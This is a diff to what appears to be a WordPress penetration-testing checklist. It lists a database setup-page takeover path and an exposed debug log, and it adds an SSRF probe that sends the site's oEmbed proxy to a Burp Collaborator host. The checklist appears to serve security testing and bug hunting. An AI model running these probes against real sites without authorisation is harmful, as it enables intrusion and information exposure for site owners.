@@ -49,3 +49,6 @@ send the post request with the following data
 - /wp-admin/setup-config.php?step=1  ===> may give access to create new database if they forgot to configure the database 
  #### Log files exposed
 - wp-content/debug.log
+
+#### ssrf through endpoint
+- Try to access https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net and the Worpress site may make a request to you.
